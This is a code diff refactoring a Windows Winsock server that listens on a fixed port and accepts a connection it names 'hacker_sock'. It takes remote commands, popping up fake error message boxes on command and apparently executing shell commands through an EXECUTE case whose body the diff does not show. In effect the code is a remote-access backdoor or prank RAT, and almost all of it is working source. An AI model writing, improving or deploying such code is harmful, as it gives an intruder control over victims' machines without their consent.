@@ -1,6 +1,5 @@
-#include <stdio.h>
-#include <tchar.h>
-#include <ws2tcpip.h>
+#include <tchar.h> // _tprintf
+#include <conio.h> // clrscr
 
 #include "Server.h"
 #include "Tools.h"
@@ -8,76 +7,75 @@
 #pragma comment(lib, "Ws2_32.lib")
 
 SOCKET InitServer()
-{
-	return 0;
-}
-
-VOID RunServer( )
-{
-	INT     iResult = 0;
+{	
 	WSADATA wsaData;
-	if (iResult = WSAStartup(MAKEWORD(2, 2), &wsaData))
+	INT     iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
+	if (iResult != 0)
 	{
-		_tprintf("WSAStartup failed with error: %d\n", iResult);
+		_tprintf(TEXT("WSAStartup failed with error: %d\n"), iResult);
 
-		return ;
+		return INVALID_SOCKET;
 	}
-	_tprintf("Startup finished\n");
+	_tprintf(TEXT("Startup finished\n"));
 
 	SOCKET listen_sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
 	if (listen_sock == INVALID_SOCKET)
 	{
-		_tprintf("socket failed with error: %ld\n", WSAGetLastError());
+		_tprintf(TEXT("socket failed with error: %ld\n"), WSAGetLastError());
 
 		WSACleanup();
 
-		return;
+		return INVALID_SOCKET;
 	}
 
 	SOCKADDR_IN addr_sock;
-	addr_sock.sin_family      = AF_INET;
+	addr_sock.sin_family       = AF_INET;
 	addr_sock.sin_addr.s_addr = htonl(INADDR_ANY);
-	addr_sock.sin_port        = htons(7777);
-	if (bind(listen_sock, (LPSOCKADDR)&addr_sock, sizeof(struct sockaddr)))
+	addr_sock.sin_port        = htons(DEFAULT_PORT);
+	if (bind(listen_sock, (LPSOCKADDR)&addr_sock, sizeof(addr_sock)) == SOCKET_ERROR)
 	{
-		_tprintf("bind failed with error: %d\n", WSAGetLastError());
+		_tprintf(TEXT("bind failed with error: %d\n"), WSAGetLastError());
 
 		closesocket(listen_sock);
 		WSACleanup();
 
-		return;
+		return INVALID_SOCKET;
 	}
-	_tprintf("Binding socket finished\n");
+	_tprintf(TEXT("Binding socket finished\n"));
 
-	if (listen(listen_sock, 1))
+	if (listen(listen_sock, 1) == SOCKET_ERROR)
 	{
-		_tprintf("listen failed with error: %d\n", WSAGetLastError());
+		_tprintf(TEXT("listen failed with error: %d\n"), WSAGetLastError());
 
 		closesocket(listen_sock);
 		WSACleanup();
 
-		return;
+		return INVALID_SOCKET;
 	}
-	_tprintf("Started to listen\n");
+	_tprintf(TEXT("Socket started to listen\n"));
 
-	TCHAR  cmd[CMD_LENGTH + 1]    = { 0 }, // (cmd + space) + '\0'
-		  args[MAX_BUFFER_LENGTH] = { 0 };
+	return listen_sock;
+}
+
+VOID RunServer(SOCKET listen_sock)
+{
+	ClearConsole();
+
+	char   cmd[CMD_LENGTH + 1] = { 0 }, // (cmd + space) + '\0'
+		  args[ARGS_LENGTH]    = { 0 };
 	while (TRUE)
 	{
-		_tprintf("Waiting for the client\n");
+		_tprintf(TEXT("Waiting for the client\n"));
 
-		SOCKET hacker_sock = INVALID_SOCKET; 
-		if ((hacker_sock = accept(listen_sock, NULL, NULL)) == INVALID_SOCKET)
+		SOCKET hacker_sock = accept(listen_sock, NULL, NULL);
+		if (hacker_sock == INVALID_SOCKET)
 		{
-			_tprintf("accept failed with error: %d\n", WSAGetLastError());
+			_tprintf(TEXT("accept failed with error: %d\n"), WSAGetLastError());
 
-			closesocket(listen_sock);
-
-			WSACleanup(); 
 			return;
 		}
 
-		_tprintf("Connected\n");
+		_tprintf(TEXT("Connected\n"));
 		while (TRUE)
 		{
 			int bytes = recv(hacker_sock, cmd, CMD_LENGTH, 0);
@@ -86,12 +84,15 @@ VOID RunServer( )
 			if (!bytes || bytes == SOCKET_ERROR)
 				break;
 
-			_tprintf("cmd:'%s', args:'%s'\n", cmd, args);
+			_tprintf(TEXT("cmd:'%hs', args:'%hs'\n"), cmd, args);
 			switch (cmd[0])
 			{
-			case MESSAGE:
-				MessageBoxExA(NULL, args, TEXT("GG WP"), MB_ICONERROR, MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL));
+			case MESSAGE: {
+				TCHAR buffer[ARGS_LENGTH] = { 0 };
+				_stprintf_s(buffer, ARGS_LENGTH, TEXT("%hs"), args);
+				MessageBoxEx(NULL, buffer, TEXT("ERROR"), MB_ICONERROR, MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL));
 				break;
+			}
 
 			case EXECUTE: {
 				//TCHAR buf[ARGS_LENGTH + 3] = TEXT(" /c"); // +3 for '/c'
@@ -115,6 +116,9 @@ VOID RunServer( )
 		}
 
 		closesocket(hacker_sock);
-		_tprintf("Client disconnected\n");
+
+		_tprintf(TEXT("Client disconnected\n"));
+		SleepEx(5000, FALSE);
+		ClearConsole();
 	}
 }
